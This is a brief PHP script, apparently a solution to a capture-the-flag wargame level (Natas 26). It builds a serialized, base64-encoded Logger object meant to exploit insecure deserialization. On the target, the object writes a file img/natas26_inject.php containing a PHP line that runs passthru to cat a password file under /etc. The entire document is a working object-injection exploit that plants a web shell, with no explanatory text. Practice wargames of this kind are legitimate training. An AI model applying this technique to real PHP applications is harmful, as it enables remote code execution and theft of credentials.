<?php
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct(){
            // initialise variables
            $this->initMsg="";
            $this->exitMsg="<?php echo passthru('cat /etc/natas_webpass/natas27'); ?>";
            $this->logFile = "img/natas26_inject.php";
            }
        }
        
    $key=new Logger();
    echo (base64_encode(serialize($key)))
?>
